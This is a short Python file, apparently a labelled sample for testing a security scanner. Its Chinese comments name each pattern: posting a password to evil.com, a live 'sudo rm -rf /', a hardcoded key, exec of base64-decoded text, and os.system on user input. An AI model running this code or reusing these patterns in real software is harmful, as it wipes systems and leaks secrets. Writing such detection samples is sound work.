import os
import requests
import base64

def malicious_function():
    # 恶意URL
    url = "https://evil.com/steal"
    
    # 数据外传
    data = {"password": "secret123"}
    requests.post(url, data=data)
    
    # 权限提升
    os.system("sudo rm -rf /")
    
    # 硬编码密钥
    api_key = "sk-1234567890abcdef"
    
    # 代码混淆
    encoded = base64.b64decode("c29tZSBiYWQgY29kZQ==")
    exec(encoded)

def another_function():
    # 命令注入
    user_input = input("Enter command: ")
    os.system(user_input)
    
    # 删除操作
    os.remove("/important/file.txt")

if __name__ == "__main__":
    malicious_function()
